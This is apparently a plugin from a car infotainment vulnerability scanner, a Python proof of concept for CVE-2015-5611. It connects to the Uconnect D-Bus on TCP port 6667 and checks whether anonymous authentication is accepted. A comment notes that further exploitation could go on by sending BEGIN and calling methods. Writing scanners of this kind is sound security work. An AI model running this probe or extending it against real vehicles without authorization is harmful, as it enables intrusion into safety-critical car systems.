#!/usr/bin/env python3
"""
PoC Name: D-Bus Anonymous Authentication
CVE: CVE-2015-5611
Component: Network Stack
Category: Network
Severity: Critical
CVSS: 9.0
Description: D-Bus服务通过TCP:6667接受匿名认证
Prerequisites: 与目标车机处于同一局域网并放行相关应用层端口
Usage: python 17_DBus_Anon_Auth.py <target_ip>
"""
from __future__ import annotations

import socket
import sys
from iv_plugin_base import IVIVulnerabilityPlugin

VULN = {
    "id":             0,
    "cve":            "CVE-2015-5611",
    "year":           2015,
    "domain":         "network",
    "vendor_product": "Unknown",
    "component":      "Unknown",
    "type":           "Unknown",
    "summary":        "DBus Anon Auth",
    "source_url":     "https://nvd.nist.gov/vuln/detail/CVE-2015-5611",
    "affected":       [{"vendor": "Unknown", "product": "Unknown", "versions": []}],
    "references":     ["https://nvd.nist.gov/vuln/detail/CVE-2015-5611"],
    "signature_tokens": ["CVE-2015-5611"],
}


def _run_poc(plugin, vuln=None) -> dict:
    """
    CVE-2015-5611 主动探针包装（兼容旧式 exploit() 实现）。
    通过调用插件自身的 exploit 逻辑并将结果标准化为 detection_confidence 格式。
    """
    try:
        result = plugin.exploit() or {}
    except Exception as exc:
        result = {"error": str(exc)}

    vulnerable = result.get("vulnerable", None)
    evidence = {
        "cve":       vuln.get("cve", "CVE-2015-5611") if vuln else "CVE-2015-5611",
        "target":    getattr(plugin, "target_ip", "unknown"),
        "technique": "legacy exploit() wrapper",
        "raw":       str(result)[:300],
    }

    # 根据是否有主动网络调用推断等级
    level = "B" if vulnerable is True else ("C" if vulnerable is False else "D")
    try:
        from probe_utils import detection_confidence as _detection_confidence
        return _detection_confidence(level, evidence, vulnerable=vulnerable)
    except ImportError:
        return {
            "detection_confidence": {
                "level": level, "vulnerable": vulnerable,
                "evidence": evidence, "method": "legacy_wrapper",
            }
        }


class JeepDBusPlugin(IVIVulnerabilityPlugin):
    meta_display_id = "POC-NET-010"
    meta_poc_name = 'CVE-2015-5611 Auth Active Validation'
    meta_cve_id = "CVE-2015-5611"
    meta_source_url = "https://nvd.nist.gov/vuln/detail/CVE-2015-5611"
    meta_references = ['https://nvd.nist.gov/vuln/detail/CVE-2015-5611']
    meta_severity = "Critical"
    meta_protocol = "tcp"
    meta_target_os = ["all"]
    meta_required_params = ["target_ip"]
    meta_profiles         = ["network"]
    is_disruptive = False
    meta_destructive_level = "Safe"

    def __init__(self, target_config, logger=None):
        super().__init__(target_config, logger)
        self.target_port = 6667
        self.results["cve_id"] = "CVE-2015-5611"

    def check_prerequisites(self):
        return True

    def exploit(self):
        self.logger.info(f"Connecting to Uconnect D-Bus on {self.target_ip}:6667...")
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((self.target_ip, self.target_port))
            
            # D-Bus 握手：发送 0 字节
            s.send(b'\x00') 
            
            # 尝试匿名认证
            self.logger.info("Sending AUTH ANONYMOUS...")
            s.send(b"AUTH ANONYMOUS\r\n")
            
            res = s.recv(1024)
            self.logger.info(f"Response: {res}")
            
            if b"OK" in res:
                self.results["vulnerable"] = True
                self.results["evidence"] = "D-Bus accepted Anonymous Authentication."
                # 进一步利用可以发送: BEGIN\r\n 然后调用方法
            else:
                self.results["vulnerable"] = False
                self.results["evidence"] = "D-Bus authentication rejected."
                
            s.close()
        except ConnectionRefusedError:
            self.results["vulnerable"] = False
            self.results["evidence"] = "Port 6667 closed."
        except Exception as e:
            self.logger.error(f"Error: {e}")
            self.results["vulnerable"] = False
            
        return self.results

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python 17_DBus_Anon_Auth.py <target_ip>")
        sys.exit(1)
    plugin = JeepDBusPlugin({"target_ip": sys.argv[1]})
    plugin.run_verify()
